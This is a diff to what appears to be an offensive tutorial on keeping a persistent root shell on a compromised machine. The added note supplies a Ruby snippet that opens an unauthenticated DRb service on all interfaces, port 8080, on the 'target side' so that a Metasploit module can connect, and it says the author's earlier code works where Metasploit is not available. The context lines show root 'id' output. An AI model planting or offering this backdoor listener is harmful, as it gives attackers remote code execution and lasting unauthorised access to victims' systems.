@@ -73,3 +73,14 @@ id
 uid=0(root) gid=0(root) groups=0(root)
 ```
 As you can see, even you loose the session you can connect again and again; it's a service, remember? 
+
+
+Note: For you using metasploit module, you don't need even the RShell class. You'll need the following on the target side.
+
+```ruby
+#!/usr/bin/env ruby
+require 'drb'
+DRb.start_service("druby://0.0.0.0:8080", []).thread.join
+```
+
+I recommend to use the first code in case metasploit is not available.
